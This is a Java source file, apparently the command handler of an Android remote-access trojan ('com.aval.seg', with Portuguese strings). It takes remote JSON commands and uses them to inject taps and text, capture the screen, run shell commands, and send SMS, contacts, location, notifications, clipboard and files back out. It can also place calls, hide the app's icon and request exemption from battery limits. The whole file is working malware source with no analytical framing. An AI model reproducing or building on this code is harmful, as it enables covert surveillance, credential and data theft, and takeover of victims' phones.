package com.aval.seg;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.provider.Settings;
import android.view.KeyEvent;
import android.widget.Toast;

import org.json.JSONObject;

public final class Cmd {

    public static void handle(Context c, String m) {
        try {
            JSONObject o = new JSONObject(m);
            String cmd = o.optString("c");
            KeySvc k = KeySvc.I;

            switch (cmd) {
                case "touch":
                    if (k != null) k.touch((float) o.optDouble("x"), (float) o.optDouble("y"));
                    break;
                case "long":
                    if (k != null) k.longPress((float) o.optDouble("x"), (float) o.optDouble("y"));
                    break;
                case "swipe":
                    if (k != null) k.swipe((float) o.optDouble("x1"), (float) o.optDouble("y1"),
                            (float) o.optDouble("x2"), (float) o.optDouble("y2"), o.optInt("ms", 260));
                    break;
                case "text":
                    if (k != null) k.setText(o.optString("s"));
                    break;
                case "key":
                    if (k != null) k.key(o.optInt("code", 4));
                    break;
                case "screen":
                    if (k != null) k.screenOn(o.optBoolean("on", true));
                    break;
                case "shot":
                    if (k != null) k.shotOn = o.optBoolean("on", true);
                    break;
                case "ov":
                    if (k != null) k.overlay(o.optBoolean("on", true));
                    break;
                case "q":
                    ScreenSvc.Q = Math.max(15, Math.min(90, o.optInt("v", 38)));
                    break;
                case "fps":
                    ScreenSvc.FPS = Math.max(1, Math.min(15, o.optInt("v", 8)));
                    break;
                case "toast":
                    Toast.makeText(c, o.optString("s"), Toast.LENGTH_LONG).show();
                    break;
                case "url":
                    c.startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(o.optString("u")))
                            .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
                    break;
                case "open":
                    Intent i = c.getPackageManager().getLaunchIntentForPackage(o.optString("pkg"));
                    if (i != null) c.startActivity(i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
                    else Net.send("{\"t\":\"err\",\"o\":\"pacote nao encontrado\"}");
                    break;
                case "shell":
                    Net.send("{\"t\":\"sh\",\"o\":\"" + Util.esc(Util.exec(o.optString("cmd"))) + "\"}");
                    break;
                case "sms":
                    Net.send("{\"t\":\"sms\",\"o\":\"" + Util.esc(Extra.sms(c)) + "\"}");
                    break;
                case "contacts":
                    Net.send("{\"t\":\"cts\",\"o\":\"" + Util.esc(Extra.contacts(c)) + "\"}");
                    break;
                case "apps":
                    Net.send("{\"t\":\"apps\",\"o\":\"" + Util.esc(Extra.apps(c)) + "\"}");
                    break;
                case "loc":
                    Net.send("{\"t\":\"loc\",\"o\":\"" + Util.esc(Extra.loc(c)) + "\"}");
                    break;
                case "info":
                    Net.send("{\"t\":\"info\",\"o\":\"" + Util.esc(Extra.info(c)) + "\"}");
                    break;
                case "notif":
                    Net.send("{\"t\":\"notif\",\"o\":\"" + Util.esc(Extra.notifs(c)) + "\"}");
                    break;
                case "clip":
                    Net.send("{\"t\":\"clip\",\"o\":\"" + Util.esc(Extra.clip(c)) + "\"}");
                    break;
                case "setclip":
                    Extra.setClip(c, o.optString("s"));
                    break;
                case "ls":
                    Net.send("{\"t\":\"ls\",\"o\":\"" + Util.esc(Extra.ls(o.optString("p", "/sdcard"))) + "\"}");
                    break;
                case "dl":
                    Net.send("{\"t\":\"dl\",\"o\":\"" + Util.esc(Extra.cat(o.optString("p"), o.optInt("n", 64000))) + "\"}");
                    break;
                case "bright":
                    Extra.bright(c, o.optInt("v", 50));
                    break;
                case "torch":
                    Extra.torch(c, o.optBoolean("on", true));
                    break;
                case "vol":
                    Extra.volume(c, o.optInt("dir", 1), o.optInt("v", -1));
                    break;
                case "play":
                    Extra.media(c, KeyEvent.KEYCODE_MEDIA_PLAY_PAUSE);
                    break;
                case "next":
                    Extra.media(c, KeyEvent.KEYCODE_MEDIA_NEXT);
                    break;
                case "prev":
                    Extra.media(c, KeyEvent.KEYCODE_MEDIA_PREVIOUS);
                    break;
                case "dial":
                    Extra.dial(c, o.optString("n"), false);
                    break;
                case "call":
                    Extra.dial(c, o.optString("n"), true);
                    break;
                case "hide":
                    c.getPackageManager().setComponentEnabledSetting(
                            new ComponentName(c, "com.aval.seg.Alias"),
                            o.optBoolean("on", true)
                                    ? PackageManager.COMPONENT_ENABLED_STATE_DISABLED
                                    : PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                            PackageManager.DONT_KILL_APP);
                    break;
                case "battery":
                    Intent b = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                            Uri.parse("package:" + c.getPackageName()));
                    b.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    c.startActivity(b);
                    break;
                case "wr":
                    Intent w = new Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS,
                            Uri.parse("package:" + c.getPackageName()));
                    w.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    c.startActivity(w);
                    break;
                case "recon":
                    Net.send("{\"t\":\"info\",\"o\":\"reconectando\"}");
                    Net.start(c);
                    break;
                case "ping":
                    Net.send("{\"t\":\"pong\"}");
                    break;
            }
        } catch (Throwable t) {
            Net.send("{\"t\":\"err\",\"o\":\"" + Util.esc(String.valueOf(t)) + "\"}");
        }
    }
}